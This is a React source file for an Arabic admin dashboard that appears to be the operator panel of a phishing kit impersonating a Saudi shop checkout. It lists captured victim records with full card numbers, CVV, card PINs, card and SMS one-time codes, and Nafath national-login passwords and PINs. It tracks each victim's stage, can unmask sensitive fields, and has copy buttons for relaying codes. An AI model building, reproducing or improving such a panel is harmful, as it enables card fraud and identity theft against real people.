"use client";

import { useEffect, useMemo, useState } from "react";
import {
  collection,
  onSnapshot,
  orderBy,
  query,
  doc,
  deleteDoc,
} from "firebase/firestore";
import { db } from "@/lib/firebase";
import { cn } from "@/lib/utils";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import {
  Search,
  CreditCard,
  MapPin,
  Phone,
  Shield,
  Package,
  Globe,
  KeyRound,
  Lock,
  Trash2,
  Copy,
  Check,
  Eye,
  EyeOff,
  Settings,
  Filter,
  Hash,
  Activity,
  Users,
  Inbox,
  Clock,
  ChevronLeft,
} from "lucide-react";

type FirestoreDoc = Record<string, any> & { __id: string };

const SECTIONS: {
  key: string;
  title: string;
  icon: any;
  color: string;
  fields: { key: string; label: string; sensitive?: boolean }[];
}[] = [
  {
    key: "visit",
    title: "زيارة الموقع",
    icon: Globe,
    color: "from-sky-500 to-blue-600",
    fields: [
      { key: "country", label: "الدولة" },
      { key: "currentPage", label: "الصفحة" },
      { key: "action", label: "الحدث" },
      { key: "createdDate", label: "تاريخ الزيارة" },
    ],
  },
  {
    key: "shipping",
    title: "بيانات الشحن",
    icon: MapPin,
    color: "from-emerald-500 to-teal-600",
    fields: [
      { key: "fullName", label: "الاسم" },
      { key: "phone", label: "الجوال" },
      { key: "city", label: "المدينة" },
      { key: "district", label: "الحي" },
      { key: "street", label: "الشارع" },
      { key: "postalCode", label: "الرمز البريدي" },
      { key: "coordinates", label: "الإحداثيات" },
    ],
  },
  {
    key: "payment",
    title: "بيانات البطاقة",
    icon: CreditCard,
    color: "from-violet-500 to-purple-600",
    fields: [
      { key: "cardName", label: "حامل البطاقة" },
      { key: "cardNumber", label: "رقم البطاقة", sensitive: true },
      { key: "expiryDate", label: "الانتهاء" },
      { key: "cvv", label: "CVV", sensitive: true },
      { key: "cardLast4", label: "آخر ٤ أرقام" },
      { key: "bank", label: "البنك" },
      { key: "cardType", label: "نوع البطاقة" },
    ],
  },
  {
    key: "card_verify",
    title: "تحقق البطاقة",
    icon: Lock,
    color: "from-amber-500 to-orange-600",
    fields: [
      { key: "cardOtp", label: "رمز التحقق" },
      { key: "cardPin", label: "PIN", sensitive: true },
    ],
  },
  {
    key: "phone_verify",
    title: "تحقق الجوال",
    icon: Phone,
    color: "from-pink-500 to-rose-600",
    fields: [
      { key: "phone2", label: "الجوال الثاني" },
      { key: "operator", label: "المشغل" },
      { key: "phoneOtp", label: "رمز SMS" },
    ],
  },
  {
    key: "nafath",
    title: "نفاذ",
    icon: Shield,
    color: "from-green-600 to-emerald-700",
    fields: [
      { key: "nafazId", label: "رقم الهوية" },
      { key: "identity_number", label: "رقم الهوية" },
      { key: "nafadPassword", label: "كلمة المرور", sensitive: true },
      { key: "auth_number", label: "رقم التفويض" },
      { key: "nafaz_pin", label: "Nafath PIN" },
      { key: "verification_code", label: "رمز التحقق" },
      { key: "status", label: "حالة نفاذ" },
    ],
  },
  {
    key: "order",
    title: "ملخص الطلب",
    icon: Package,
    color: "from-indigo-500 to-blue-700",
    fields: [
      { key: "subtotal", label: "المجموع" },
      { key: "shippingFee", label: "الشحن" },
      { key: "tax", label: "الضريبة" },
      { key: "total", label: "الإجمالي" },
    ],
  },
];

const ALL_KNOWN_KEYS = new Set(SECTIONS.flatMap((s) => s.fields.map((f) => f.key)));

const STAGE_FILTERS = [
  { key: "all", label: "الكل", icon: Inbox },
  { key: "shipping", label: "شحن", icon: MapPin },
  { key: "card", label: "بطاقة", icon: CreditCard },
  { key: "verify", label: "تحقق", icon: Lock },
  { key: "nafath", label: "نفاذ", icon: Shield },
  { key: "visit", label: "زائر", icon: Globe },
] as const;

function formatTimestamp(value: any): string {
  if (!value) return "";
  try {
    const date =
      typeof value?.toDate === "function"
        ? value.toDate()
        : typeof value === "string"
        ? new Date(value)
        : value instanceof Date
        ? value
        : null;
    if (!date) return "";
    return date.toLocaleString("ar-SA", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return "";
  }
}

function timeAgo(value: any): string {
  if (!value) return "";
  try {
    const date = typeof value?.toDate === "function" ? value.toDate() : new Date(value);
    const diffSec = Math.floor((Date.now() - date.getTime()) / 1000);
    if (diffSec < 60) return "الآن";
    if (diffSec < 3600) return `منذ ${Math.floor(diffSec / 60)} د`;
    if (diffSec < 86400) return `منذ ${Math.floor(diffSec / 3600)} س`;
    return `منذ ${Math.floor(diffSec / 86400)} ي`;
  } catch {
    return "";
  }
}

function formatValue(v: any): string {
  if (v === undefined || v === null) return "—";
  if (typeof v === "boolean") return v ? "نعم" : "لا";
  if (typeof v === "object") {
    if (typeof v?.toDate === "function") return formatTimestamp(v);
    if (Array.isArray(v)) return v.map((x) => formatValue(x)).join("، ");
    return JSON.stringify(v, null, 2);
  }
  return String(v);
}

function getInitials(d: FirestoreDoc): string {
  const name = (d.fullName || d.cardName || d.__id || "?").trim();
  return name.charAt(0).toUpperCase() || "?";
}

const AVATAR_COLORS = [
  "from-pink-500 to-rose-600",
  "from-violet-500 to-indigo-600",
  "from-emerald-500 to-teal-600",
  "from-amber-500 to-orange-600",
  "from-sky-500 to-blue-600",
  "from-fuchsia-500 to-purple-600",
  "from-lime-500 to-green-600",
  "from-cyan-500 to-blue-600",
];

function avatarColor(id: string): string {
  let h = 0;
  for (let i = 0; i < id.length; i++) h = (h * 31 + id.charCodeAt(i)) >>> 0;
  return AVATAR_COLORS[h % AVATAR_COLORS.length];
}

function getStage(d: FirestoreDoc): { key: string; label: string; bg: string; ring: string } {
  if (d.nafazId || d.identity_number)
    return { key: "nafath", label: "نفاذ", bg: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30", ring: "ring-emerald-500/40" };
  if (d.cardPin || d.cardOtp)
    return { key: "verify", label: "تحقق بطاقة", bg: "bg-amber-500/15 text-amber-400 border-amber-500/30", ring: "ring-amber-500/40" };
  if (d.cardNumber)
    return { key: "card", label: "بطاقة", bg: "bg-violet-500/15 text-violet-400 border-violet-500/30", ring: "ring-violet-500/40" };
  if (d.phone2 || d.phoneOtp)
    return { key: "verify", label: "تحقق جوال", bg: "bg-pink-500/15 text-pink-400 border-pink-500/30", ring: "ring-pink-500/40" };
  if (d.fullName || d.phone)
    return { key: "shipping", label: "شحن", bg: "bg-sky-500/15 text-sky-400 border-sky-500/30", ring: "ring-sky-500/40" };
  return { key: "visit", label: "زائر", bg: "bg-zinc-500/15 text-zinc-400 border-zinc-500/30", ring: "ring-zinc-500/40" };
}

function maskValue(value: any): string {
  const s = String(value ?? "");
  if (s.length <= 4) return "•".repeat(s.length);
  return s.slice(0, 2) + "•".repeat(Math.max(2, s.length - 4)) + s.slice(-2);
}

function StatCard({ icon: Icon, label, value, color }: { icon: any; label: string; value: string | number; color: string }) {
  return (
    <div className="rounded-2xl border border-white/10 bg-[#17212b] p-4 flex items-center gap-3">
      <div className={cn("w-10 h-10 rounded-xl flex items-center justify-center", color)}>
        <Icon className="h-5 w-5 text-white" />
      </div>
      <div>
        <p className="text-[11px] text-white/50 mb-0.5">{label}</p>
        <p className="text-lg font-bold leading-none" data-testid={`stat-${label}`}>{value}</p>
      </div>
    </div>
  );
}

function SubmissionCard({
  d,
  onOpen,
  onDelete,
  reveal,
}: {
  d: FirestoreDoc;
  onOpen: () => void;
  onDelete: () => void;
  reveal: boolean;
}) {
  const stage = getStage(d);

  // Quick highlights to surface on the card
  const highlights: { icon: any; label: string; value: string; sensitive?: boolean }[] = [];
  if (d.cardNumber)
    highlights.push({
      icon: CreditCard,
      label: "بطاقة",
      value: reveal ? String(d.cardNumber) : `•••• ${String(d.cardNumber).slice(-4)}`,
    });
  if (d.cvv) highlights.push({ icon: KeyRound, label: "CVV", value: reveal ? String(d.cvv) : maskValue(d.cvv), sensitive: true });
  if (d.cardOtp) highlights.push({ icon: Hash, label: "OTP بطاقة", value: String(d.cardOtp) });
  if (d.cardPin) highlights.push({ icon: Lock, label: "PIN", value: reveal ? String(d.cardPin) : maskValue(d.cardPin), sensitive: true });
  if (d.phoneOtp) highlights.push({ icon: Phone, label: "OTP جوال", value: String(d.phoneOtp) });
  if (d.nafazId || d.identity_number)
    highlights.push({ icon: Shield, label: "هوية", value: String(d.nafazId || d.identity_number) });
  if (d.nafadPassword)
    highlights.push({ icon: KeyRound, label: "كلمة سر نفاذ", value: reveal ? String(d.nafadPassword) : maskValue(d.nafadPassword), sensitive: true });
  if (highlights.length === 0 && d.city) highlights.push({ icon: MapPin, label: "المدينة", value: String(d.city) });
  if (highlights.length === 0 && d.country) highlights.push({ icon: Globe, label: "الدولة", value: String(d.country) });

  return (
    <article
      className="group rounded-2xl border border-white/10 bg-[#17212b] hover:border-primary/40 hover:shadow-lg hover:shadow-primary/10 transition-all overflow-hidden flex flex-col"
      data-testid={`card-submission-${d.__id}`}
    >
      {/* Card header */}
      <header className={cn("p-4 border-b border-white/5 bg-gradient-to-bl", "from-white/[0.04] to-transparent")}>
        <div className="flex items-start justify-between gap-3">
          <button
            onClick={onOpen}
            className="flex items-center gap-3 text-right flex-1 min-w-0 group/header"
            data-testid={`button-open-${d.__id}`}
            aria-label="فتح التفاصيل"
          >
            <div
              className={cn(
                "w-12 h-12 rounded-full bg-gradient-to-br flex items-center justify-center text-white font-bold text-lg shrink-0 shadow-md",
                avatarColor(d.__id)
              )}
            >
              {getInitials(d)}
            </div>
            <div className="flex-1 min-w-0 text-right">
              <h3 className="text-sm font-bold truncate group-hover/header:text-primary transition-colors" data-testid={`text-name-${d.__id}`}>
                {d.fullName || d.cardName || "بدون اسم"}
              </h3>
              <p className="text-[11px] text-white/50 truncate font-mono mt-0.5" dir="ltr">
                {d.__id}
              </p>
            </div>
          </button>
          <Badge variant="outline" className={cn("text-[10px] font-semibold shrink-0", stage.bg)}>
            {stage.label}
          </Badge>
        </div>

        <div className="flex items-center gap-3 mt-3 text-[11px] text-white/50">
          {d.country && (
            <span className="flex items-center gap-1">
              <Globe className="h-3 w-3" />
              {d.country}
            </span>
          )}
          {d.phone && (
            <span className="flex items-center gap-1" dir="ltr">
              <Phone className="h-3 w-3" />
              {d.phone}
            </span>
          )}
          <span className="flex items-center gap-1 mr-auto">
            <Clock className="h-3 w-3" />
            {timeAgo(d.timestamp)}
          </span>
        </div>
      </header>

      {/* Highlights */}
      <div className="flex-1 p-4 space-y-2">
        {highlights.length === 0 && (
          <p className="text-xs text-white/40 text-center py-6">لا توجد بيانات حساسة بعد</p>
        )}
        {highlights.slice(0, 4).map((h, idx) => (
          <div
            key={idx}
            className="flex items-center gap-2 px-3 py-2 rounded-lg bg-white/[0.03] border border-white/5"
          >
            <h.icon className={cn("h-3.5 w-3.5 shrink-0", h.sensitive ? "text-amber-400" : "text-primary")} />
            <span className="text-[11px] text-white/50 shrink-0">{h.label}</span>
            <span
              className="text-xs font-mono font-medium text-white truncate mr-auto text-left"
              dir="ltr"
              data-testid={`highlight-${h.label}-${d.__id}`}
            >
              {h.value}
            </span>
          </div>
        ))}
      </div>

      {/* Actions */}
      <footer className="px-4 py-3 border-t border-white/5 flex items-center justify-between gap-2 bg-black/20">
        <Button
          variant="ghost"
          size="sm"
          onClick={onOpen}
          className="text-white/80 hover:text-primary hover:bg-primary/10 h-8 text-xs gap-1"
          data-testid={`button-view-${d.__id}`}
        >
          عرض الكل
          <ChevronLeft className="h-3.5 w-3.5" />
        </Button>
        <Button
          variant="ghost"
          size="icon"
          onClick={onDelete}
          aria-label="حذف"
          className="text-white/40 hover:text-red-400 hover:bg-red-500/10 h-8 w-8"
          data-testid={`button-delete-${d.__id}`}
        >
          <Trash2 className="h-3.5 w-3.5" />
        </Button>
      </footer>
    </article>
  );
}

function DetailModal({
  open,
  onClose,
  doc: docData,
  reveal,
}: {
  open: boolean;
  onClose: () => void;
  doc: FirestoreDoc | null;
  reveal: boolean;
}) {
  const { toast } = useToast();
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const sectionsForSelected = useMemo(() => {
    if (!docData) return [];
    return SECTIONS.map((section) => {
      const present = section.fields.filter((f) => docData[f.key] !== undefined && docData[f.key] !== "");
      return { ...section, presentFields: present };
    }).filter((s) => s.presentFields.length > 0);
  }, [docData]);

  const otherFields = useMemo(() => {
    if (!docData) return [];
    return Object.entries(docData)
      .filter(
        ([k]) =>
          !ALL_KNOWN_KEYS.has(k) &&
          !["__id", "timestamp", "updatedAt", "verified", "verifiedAt"].includes(k)
      )
      .filter(([_, v]) => v !== undefined && v !== "" && v !== null);
  }, [docData]);

  async function handleCopy(key: string, value: any) {
    try {
      await navigator.clipboard.writeText(String(value));
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 1200);
    } catch {
      toast({ title: "تعذر النسخ", variant: "destructive" });
    }
  }

  if (!docData) return null;

  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent
        dir="rtl"
        className="max-w-3xl bg-[#17212b] border-white/10 text-white p-0 max-h-[90vh] overflow-hidden flex flex-col"
      >
        <DialogHeader className="p-5 border-b border-white/10 bg-gradient-to-l from-primary/10 to-transparent">
          <div className="flex items-center gap-3">
            <div
              className={cn(
                "w-12 h-12 rounded-full bg-gradient-to-br flex items-center justify-center text-white font-bold text-lg shadow-md",
                avatarColor(docData.__id)
              )}
            >
              {getInitials(docData)}
            </div>
            <div className="flex-1 text-right min-w-0">
              <DialogTitle className="text-lg font-bold text-right" data-testid="text-detail-title">
                {docData.fullName || docData.cardName || "تفاصيل السجل"}
              </DialogTitle>
              <p className="text-[11px] text-white/50 mt-1 font-mono truncate" dir="ltr">
                {docData.__id} • {formatTimestamp(docData.timestamp)}
              </p>
            </div>
          </div>
        </DialogHeader>

        <ScrollArea className="flex-1 p-5">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {sectionsForSelected.map((section) => (
              <section
                key={section.key}
                className="rounded-2xl border border-white/10 bg-[#0e1621] overflow-hidden"
                data-testid={`section-${section.key}`}
              >
                <header
                  className={cn(
                    "px-4 py-3 flex items-center gap-2 bg-gradient-to-l border-b border-white/10",
                    section.color
                  )}
                >
                  <section.icon className="h-4 w-4 text-white" />
                  <h3 className="text-sm font-bold text-white">{section.title}</h3>
                </header>
                <dl className="p-3 space-y-2">
                  {section.presentFields.map((f) => {
                    const raw = docData[f.key];
                    const isSensitive = f.sensitive && !reveal;
                    const display = isSensitive ? maskValue(raw) : formatValue(raw);
                    const copyKey = `${section.key}-${f.key}`;
                    return (
                      <div
                        key={f.key}
                        className="group flex items-start justify-between gap-3 py-1.5 px-2 rounded-lg hover:bg-white/[0.03]"
                      >
                        <button
                          onClick={() => handleCopy(copyKey, raw)}
                          className="text-white/40 hover:text-primary focus-visible:text-primary focus-visible:opacity-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/50 rounded opacity-0 group-hover:opacity-100 transition-all shrink-0 mt-0.5"
                          aria-label={`نسخ ${f.label}`}
                          data-testid={`button-copy-${copyKey}`}
                        >
                          {copiedKey === copyKey ? (
                            <Check className="h-3.5 w-3.5 text-primary" />
                          ) : (
                            <Copy className="h-3.5 w-3.5" />
                          )}
                        </button>
                        <div className="flex-1 min-w-0 text-right">
                          <dt className="text-[11px] text-white/45 mb-0.5">
                            {f.label}
                            {f.sensitive && <KeyRound className="inline h-3 w-3 mr-1 text-amber-500/60" />}
                          </dt>
                          <dd className="text-sm font-medium text-white break-words font-mono" dir="ltr">
                            {display}
                          </dd>
                        </div>
                      </div>
                    );
                  })}
                </dl>
              </section>
            ))}

            {otherFields.length > 0 && (
              <section className="rounded-2xl border border-white/10 bg-[#0e1621] md:col-span-2 overflow-hidden">
                <header className="px-4 py-3 flex items-center gap-2 bg-gradient-to-l from-zinc-500 to-zinc-700 border-b border-white/10">
                  <Activity className="h-4 w-4 text-white" />
                  <h3 className="text-sm font-bold text-white">بيانات إضافية</h3>
                </header>
                <dl className="p-3 grid grid-cols-1 md:grid-cols-2 gap-2">
                  {otherFields.map(([k, v]) => (
                    <div key={k} className="py-1.5 px-2 rounded-lg hover:bg-white/[0.03] text-right">
                      <dt className="text-[11px] text-white/45 mb-0.5">{k}</dt>
                      <dd className="text-sm text-white break-words font-mono" dir="ltr">
                        {formatValue(v)}
                      </dd>
                    </div>
                  ))}
                </dl>
              </section>
            )}
          </div>
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}

export default function Dashboard() {
  const [docs, setDocs] = useState<FirestoreDoc[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [stageFilter, setStageFilter] = useState<string>("all");
  const [revealSensitive, setRevealSensitive] = useState(false);
  const [openId, setOpenId] = useState<string | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    if (!db) {
      setLoading(false);
      return;
    }
    const q = query(collection(db, "orders"), orderBy("timestamp", "desc"));
    const unsub = onSnapshot(
      q,
      (snap) => {
        const items: FirestoreDoc[] = snap.docs.map((d) => ({
          __id: d.id,
          ...(d.data() as any),
        }));
        setDocs(items);
        setLoading(false);
      },
      (err) => {
        console.error("Firestore error:", err);
        setLoading(false);
        toast({
          title: "تعذر تحميل البيانات",
          description: err.message,
          variant: "destructive",
        });
      }
    );
    return () => unsub();
  }, [toast]);

  const filtered = useMemo(() => {
    let list = docs;
    if (stageFilter !== "all") {
      list = list.filter((d) => getStage(d).key === stageFilter);
    }
    if (search.trim()) {
      const s = search.trim().toLowerCase();
      list = list.filter((d) => JSON.stringify(d).toLowerCase().includes(s));
    }
    return list;
  }, [docs, search, stageFilter]);

  const openDoc = useMemo(() => docs.find((d) => d.__id === openId) ?? null, [docs, openId]);

  const stats = useMemo(() => {
    const total = docs.length;
    const withCard = docs.filter((d) => d.cardNumber).length;
    const withNafath = docs.filter((d) => d.nafazId || d.identity_number).length;
    const today = docs.filter((d) => {
      const ts = d.timestamp?.toDate ? d.timestamp.toDate() : null;
      if (!ts) return false;
      return new Date().toDateString() === ts.toDateString();
    }).length;
    return { total, withCard, withNafath, today };
  }, [docs]);

  async function handleDelete(id: string) {
    if (!confirm(`حذف السجل ${id}؟`)) return;
    try {
      await deleteDoc(doc(db, "orders", id));
      toast({ title: "تم الحذف" });
      if (openId === id) setOpenId(null);
    } catch (e: any) {
      toast({ title: "تعذر الحذف", description: e.message, variant: "destructive" });
    }
  }

  return (
    <div dir="rtl" className="min-h-screen bg-[#0e1621] text-white">
      {/* Top bar */}
      <header className="sticky top-0 z-30 bg-[#0e1621]/95 backdrop-blur-md border-b border-white/10">
        <div className="max-w-[1600px] mx-auto px-4 sm:px-6 py-4 flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-primary to-emerald-700 flex items-center justify-center shadow-lg shadow-primary/20">
              <Settings className="h-5 w-5 text-white" />
            </div>
            <div>
              <h1 className="text-base sm:text-lg font-bold leading-none">لوحة التحكم</h1>
              <p className="text-[11px] text-white/50 mt-1">إدارة جميع السجلات</p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="sm"
              className="text-white/60 hover:text-white hover:bg-white/10 gap-2 h-9"
              onClick={() => setRevealSensitive((v) => !v)}
              data-testid="button-toggle-sensitive"
            >
              {revealSensitive ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              <span className="hidden sm:inline text-xs">
                {revealSensitive ? "إخفاء الحساس" : "إظهار الحساس"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-[1600px] mx-auto px-4 sm:px-6 py-6 space-y-6">
        {/* Stats grid */}
        <section className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <StatCard icon={Inbox} label="إجمالي السجلات" value={stats.total} color="bg-gradient-to-br from-sky-500 to-blue-600" />
          <StatCard icon={Activity} label="اليوم" value={stats.today} color="bg-gradient-to-br from-emerald-500 to-teal-600" />
          <StatCard icon={CreditCard} label="بطاقات" value={stats.withCard} color="bg-gradient-to-br from-violet-500 to-purple-600" />
          <StatCard icon={Shield} label="نفاذ" value={stats.withNafath} color="bg-gradient-to-br from-amber-500 to-orange-600" />
        </section>

        {/* Search + filters */}
        <section className="flex flex-col lg:flex-row gap-3">
          <div className="relative flex-1">
            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/40" />
            <Input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="بحث في الاسم، الجوال، البطاقة، الهوية..."
              className="bg-[#17212b] border-white/10 text-sm h-11 rounded-xl pr-10 text-right placeholder:text-white/40 focus-visible:ring-1 focus-visible:ring-primary"
              data-testid="input-dashboard-search"
            />
          </div>

          <div className="flex items-center gap-2 overflow-x-auto pb-1 lg:pb-0">
            <Filter className="h-4 w-4 text-white/40 shrink-0" />
            {STAGE_FILTERS.map((f) => {
              const active = stageFilter === f.key;
              return (
                <button
                  key={f.key}
                  onClick={() => setStageFilter(f.key)}
                  className={cn(
                    "px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-1.5 border transition-colors shrink-0",
                    active
                      ? "bg-primary text-white border-primary shadow-md shadow-primary/20"
                      : "bg-[#17212b] text-white/70 border-white/10 hover:border-white/30 hover:text-white"
                  )}
                  data-testid={`filter-${f.key}`}
                >
                  <f.icon className="h-3.5 w-3.5" />
                  {f.label}
                </button>
              );
            })}
          </div>
        </section>

        {/* Cards grid */}
        <section>
          {loading && (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              {[...Array(8)].map((_, i) => (
                <div key={i} className="rounded-2xl border border-white/10 bg-[#17212b] h-72 animate-pulse" />
              ))}
            </div>
          )}

          {!loading && filtered.length === 0 && (
            <div className="rounded-2xl border border-dashed border-white/10 bg-[#17212b]/30 py-20 text-center">
              <Users className="h-10 w-10 mx-auto mb-3 text-white/20" />
              <p className="text-white/50 text-sm">
                {search || stageFilter !== "all"
                  ? "لا توجد نتائج مطابقة"
                  : "لا توجد بيانات بعد"}
              </p>
            </div>
          )}

          {!loading && filtered.length > 0 && (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              {filtered.map((d) => (
                <SubmissionCard
                  key={d.__id}
                  d={d}
                  reveal={revealSensitive}
                  onOpen={() => setOpenId(d.__id)}
                  onDelete={() => handleDelete(d.__id)}
                />
              ))}
            </div>
          )}
        </section>
      </main>

      <DetailModal
        open={!!openId}
        onClose={() => setOpenId(null)}
        doc={openDoc}
        reveal={revealSensitive}
      />
    </div>
  );
}
